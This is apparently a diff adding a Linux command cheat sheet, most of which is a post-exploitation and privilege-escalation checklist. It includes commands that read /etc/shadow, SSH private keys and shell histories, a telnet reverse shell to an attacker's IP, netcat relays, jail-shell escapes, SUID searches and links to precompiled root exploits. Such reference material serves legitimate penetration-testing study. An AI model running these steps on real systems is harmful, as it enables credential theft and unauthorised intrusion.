@@ -1,0 +1,530 @@
+--- ---
+<h2>General Commands</h2>
+
+- General
+```Terminal
+- cd                                  ---> Move directory
+- /..                                 ---> Come back from one direcotry
+- ls (-la -lh)                        ---> List element (-la = Info, -lh = Hidden)
+- cat                                 ---> Print document
+- ./                                  ---> Execute document
+
+- shodan myip                         ---> Show public IP
+```
+
+- Information
+```
+- whoami                              ---> Print User
+- id                                  ---> Print id, group, ...
+- pwd                                 ---> Print current directory
+- isb_release -a                      ---> Server version
+- uname -r or -a                      ---> kernel version
+- ifconfig                            ---> Information IP
+- ps                                  ---> List process ongoing
+```
+
+- Management
+```Terminal
+- cp                                 ---> Copy
+- mv                                 ---> Move
+- rm                                 ---> Remove
+
+- grep "Text"                        ---> Check Text (-i=Allcases, -r=All folder file)
+- wc                                 ---> Check Number of line of the file
+- locate                             ---> Find the file location
+- which                              ---> Find the file location (BEST)
+- find                               ---> Find the file location
+- file X.txt                         ---> Check the file type
+
+- mkdir                              ---> Create a folder
+- touch                              ---> Create a document
+- anew                               ---> Create anew document with output
+- echo                               ---> Echo text
+
+- >                                  ---> Create output
+- >>                                 ---> Append text to a file
+- &                                  ---> Run command in background
+- &&                                 ---> Combine commands
+
+- ctr-z                              ---> Background task
+- fg                                 ---> Take back the background task
+
+- su USER                            ---> Switch User
+
+- systemctl {ACTION} {PROCESSE}
+   - Start
+   - Stop
+   - Enable
+   - Disable 
+```
+
+- Network
+```
+- nslookup DOMAIN           ---> Check DNS record (MX, CNAME, ...)
+```
+
+- Path
+```
+echo "export PATH=$PATH:~/go/bin" >> ~/.bashrc
+```
+
+- History & Record Commands
+```
+# History
+history
+history clear     ---> Clear History
+
+# Register Command
+command | tee >> FILE.TXT
+```
+
+- Others
+```Terminal
+# Destroy/Delete Files
+shred FILE     ---> Destoy redability of a file
+
+# Get IP
+wget -O - -q https://checkip.amazonaws.com   ---> Find your IP address in terminal
+
+# Environment Variable
+env            --->  Show environmental variables
+export X=Y     ---> Create variable ex: export IP=10.1.1.1 then $IP will equal the IP
+
+# Alias
+alias NAME='PATH/ACTION'     ---> Create Alias
+unalias your_alias_name      ---> Remove Alias
+sudo nano ~/.bashrc          ---> Permanent Alias (Edit the file & add the alias)
+```
+
+---
+
+<h2> Exploitation Commands</h2>
+
+#### Operating System
+
+- What's the distribution type? What version?
+```Terminal
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release
+cat /etc/redhat-release
+```
+
+- What's the Kernel version? (32,64,86-bit)
+```Terminal
+cat /proc/version   
+uname -a
+uname -mrs 
+rpm -q kernel 
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+```
+
+- What can be learnt from the environmental variables?
+```Terminal
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+```
+
+- Is there a printer?
+```Terminal
+lpstat -a
+```
+
+---
+
+#### Applications & Service
+
+- What services are running? Which service has which user privilege?
+```Terminal
+ps aux
+ps -ef
+top
+cat /etc/service 
+```
+
+- Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+```Terminal
+ps aux | grep root
+ps -ef | grep root
+```
+
+- What applications are installed? What version are they? Are they currently running?
+```Terminal
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/ 
+```
+
+- Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
+```Terminal
+cat /etc/syslog.conf 
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf 
+cat /etc/inetd.conf 
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ 
+```
+
+- What jobs are scheduled?
+```Terminal
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
+
+- Any plain text usernames and/or passwords?
+```Terminal
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla 
+```
+
+---
+
+#### Communications & Networking
+
+- What NIC(s) does the system have? Is it connected to another network?
+```Terminal
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network 
+```
+
+- What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
+```Terminal
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+```
+
+- What other users & hosts are communicating with the system?
+```Terminal
+lsof -i 
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+```
+
+- Whats cached? IP and/or MAC addresses
+```Terminal
+arp -e
+route
+/sbin/route -nee
+```
+
+- Is packet sniffing possible? What can be seen? Listen to live traffic
+```Terminal
+# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+```
+
+- Have you got a shell? Can you interact with the system?
+```Termminal
+# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+```
+
+- Is port forwarding possible? Redirect and interact with traffic from another view
+```Termminal
+# rinetd
+# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
+
+# fpipe
+# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+
+# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+
+`# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe`
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+```
+
+- Is tunnelling possible? Send commands locally, remotely
+```Termminal
+ssh -D 127.0.0.1:9050 -N [username]@[ip] 
+proxychains ifconfig
+```
+
+---
+
+#### Confidential Information & Users
+
+- Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
+```Termminal
+id
+who
+w
+last 
+cat /etc/passwd | cut -d:    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
+sudo -l 
+```
+
+- What sensitive files can be found? 
+```Termminal
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+```
+
+- Anything "interesting" in the home directorie(s)? If it's possible to access
+```Termminal
+ls -ahlR /root/
+ls -ahlR /home/
+```
+
+- Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
+```Termminal
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD 
+cat /root/anaconda-ks.cfg
+```
+
+- What has the user being doing? Is there any password in plain text? What have they been edting?
+```Terminal
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history 
+cat ~/.php_history
+```
+
+- What user information can be found? 
+```Termminal
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+```
+
+- Can private-key information be found? 
+```Termminal
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+```
+
+---
+
+#### File Systems
+
+- Which configuration files can be written in /etc/? Able to reconfigure a service?
+```Termminal
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
+
+find /etc/ -readable -type f 2>/dev/null                         # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+```
+
+- What can be found in /var/ ? 
+```Termminal
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd 
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+```
+
+- Any settings/files (hidden) on website? Any settings file with database information?
+```Termminal
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/ 
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/ 
+ls -alhR /var/www/html/
+```
+
+- Is there anything in the log file(s) (Could help with "Local File Includes"!)
+```Termminal
+# http://www.thegeekstuff.com/2011/08/linux-var-log-files/
+
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+`#auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp`
+```
+
+- If commands are limited, you break out of the "jail" shell?
+```Termminal
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+```
+
+- How are file-systems mounted? 
+```Termminal
+mount
+df -h
+```
+
+- Are there any unmounted file-systems?
+```Termminal
+cat /etc/fstab
+```
+
+- What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+```Termminal
+find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+``# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)`
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
+```
+
+- Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+```Termminal
+find / -writable -type d 2>/dev/null     # world-writeable folders
+find / -perm -222 -type d 2>/dev/null    # world-writeable folders
+find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
+
+find / -perm -o+x -type d 2>/dev/null    # world-executable folders
+
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
+```
+
+- Any "problem" files? Word-writeable, "nobody" files
+```Termminal
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+```
+---
+
+#### Preparation & Finding Exploit Code
+
+- What development tools/languages are installed/supported?
+```Termminal
+find / -name perl*
+find / -name python*
+find / -name gcc* 
+find / -name cc
+```
+
+- How can files be uploaded?
+```Termminal
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp* 
+find / -name ftp 
+```
+
+
+- Finding exploit code
+http://www.exploit-db.com
+http://1337day.com
+http://www.securiteam.com
+http://www.securityfocus.com
+http://www.exploitsearch.net
+http://metasploit.com/modules/
+http://securityreason.com
+http://seclists.org/fulldisclosure/
+http://www.google.com 
+
+
+- Finding more information regarding the exploit 
+http://www.cvedetails.com
+http://packetstormsecurity.org/files/cve/[CVE]
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
+http://www.vulnview.com/cve-details.php?cvename=[CVE]
+
+
+- (Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
+http://tarantula.by.ru/localroot/
+http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
